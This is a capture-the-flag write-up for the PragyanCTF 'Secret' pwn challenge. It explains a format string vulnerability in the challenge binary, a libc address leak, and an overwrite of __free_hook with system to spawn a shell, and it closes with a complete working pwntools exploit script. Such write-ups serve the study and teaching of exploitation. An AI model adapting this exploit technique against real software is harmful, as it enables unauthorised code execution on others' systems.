---
title: '[PragyanCTF] Secret'
published: true
tags: [writeup, pwn, fmtstr]
author: Christos.S
---


This is a very good challange to polish and/or improve your `format string` skills. But since the CTF's server got hacked and couldn't exploit their server, I tried to at least write an exploit for the program locally with `libc 2.30`.

I first checked what security features are enabled in the binary.

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

I then opened the binary in [Ghidra](https://ghidra-sre.org/) and started looking through the decompiled code.
After some time looking through the code, I found what I was looking for... A vulnerability I could exploit.

In the function `show_task`, I found this:

```c
    void show_tasks(task *current) {
        printf("\n\nName: %s\n",current->name);
        printf("Date: %s\n",current->num);
        printf("Length: %d\n",current->desc_length);
        printf("Description: ");
        printf(current->desc);
        return;
    }
```

The vulnerable line of code is 
```c
printf(current->desc);
```
with a `format string` vunerability

Then my first thought was to look in the binary symbols for the function `system`; with no success. This led me to believe that I should start the exploit by leaking the `libc base` address.

So now that I have a basic understanding of the binary I can think of the attack:

1. Leak `libc base` address
2. Write the `system` function's address in the `__free_hook`
3. Free an address the points to the string `/bin/sh`

> In step 2 I could have as easily overwriten the GOT entry of some funtion, since the binary only has `Partial RELRO`; but I wanted to try something different with the hook functions I have read about.

Before I start I created 3 functions to interface with the 3 main functionalities of the binary:
1. Create Task
2. Remove Task
3. Display Tasks

___

## Step 1

I found an address on the stack at the `35th` place which points `249` bytes after the start of `__libc_start_main`

```python
createTask('pwned', '/bin/bash\x00', 10, '%35$x')
libc_start_main = int(re.findall('Description: (.*)', displayTasks())[0], 16) - 249
libc_base = libc_start_main - elf.libc.symbols['__libc_start_main']
```

So after a simple substruction I was able to obtain the `libc base` address

___

## Step 2

This was by far the hardest step in the process. Writing `system`'s address in `__free_hook`. I was not able to just put the address I wanted to overwrite (`__free_hook`) on the the stack because simply my input was never saved on the stack; it went straight onto the heap. So my next option was to find an address on the stack (`2nd` place) that points to another address on the stack (`9th` place). 

Since the address that I wanted to overwrite (`9th` place) on the stack had a chance to have the same highest 2 bytes as the `__free_hooks`, I just written the lowest 2 bytes.

```python
createTask('AAAA', 'BBBB', 0xffff, 'A' * (free_hook & 0x0000ffff) + '%2$hn')
```

Then because I couldn't just write that huge of a number (address of `system`) in one go, I split it into 2 seperate writes. In the first one I wrote the lowest 2 bytes of `system`, changed the address I had on the stack to point 2 bytes forword so I was able to write the highest 2 bytes of `system` in the `__free_hook`

```python
createTask('DDDD', 'EEEE', 0xffff, 'A' * (system_libc & 0x0000ffff) + '%9$hn')
createTask('FFFF', 'GGGG', 200, 'A' * ((free_hook & 0x000000ff) + 2) + '%2$hhn')
createTask('HHHH', 'IIII', 0xffff, 'A' * ((system_libc & 0xffff0000) >> 16) + '%9$hn')
```

After all this I triggered the the `format string exploit` with `displayTasks()`.

___

## Step 3 

What is now left to do is just free an address that has the string `/bin/sh` written in it. Luckly in the `remove_task` function,

```c
memset(task_ptr->name,0,0x40);
task_ptr->enabled = 0;
task_ptr->desc_length = 0;
free(task_ptr->num);
free(task_ptr->desc);
printf("Removed %s",removename);
```
the first thing that is freed is the `num` field of the `task structure` which is the `date` that is asked when creating a task.

The 1st task I created had `/bin/sh` in the `date` or `num` field, so as soon as that is freed, `system` will be executed with `/bin/sh` giving us a shell!!

```python
removeTask('pwned')
```

---

Below is the full `xpl.py` script:

```python
#!/usr/bin/python
from pwn import *
import re

context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./task')

gdbscript = '''
init-gef
c
'''

def start():
	if args.GDB: return gdb.debug(elf.path, gdbscript)
	else: return process(elf.path)

io = start()

def createTask(name, date, descLen, desc):
	io.sendlineafter(':', '1')
	io.sendlineafter(':', name)
	io.sendlineafter(':', date)
	io.sendlineafter(':', str(descLen))
	io.sendlineafter(':', desc)

def removeTask(name):
	io.sendlineafter(':', '2')
	io.sendlineafter(':', name)

def displayTasks():
	io.sendlineafter(':', '3')
	return io.recvuntil('1.')[:-2]

# Leak libc base address
createTask('pwned', '/bin/bash\x00', 10, '%35$x')
libc_start_main = int(re.findall('Description: (.*)', displayTasks())[0], 16) - 249
libc_base = libc_start_main - elf.libc.symbols['__libc_start_main']

log.success('libc_start_main: 0x%x' % libc_start_main)
log.success('libc base: 0x%x' % libc_base)

# Overide __free_hook with system
system_libc = libc_base + elf.libc.symbols['system']
free_hook = libc_base + elf.libc.symbols['__free_hook']

log.success('system: 0x%x' % system_libc)
log.success('__free_hook: 0x%x' % (free_hook))

# Write __free_hook addr on the stack
createTask('AAAA', 'BBBB', 0xffff, 'A' * (free_hook & 0x0000ffff) + '%2$hn')

log.success("Ready to overwrite __free_hook")

createTask('DDDD', 'EEEE', 0xffff, 'A' * (system_libc & 0x0000ffff) + '%9$hn')
createTask('FFFF', 'GGGG', 200, 'A' * ((free_hook & 0x000000ff) + 2) + '%2$hhn')
createTask('HHHH', 'IIII', 0xffff, 'A' * ((system_libc & 0xffff0000) >> 16) + '%9$hn')

displayTasks()

removeTask('pwned')

io.interactive()
```
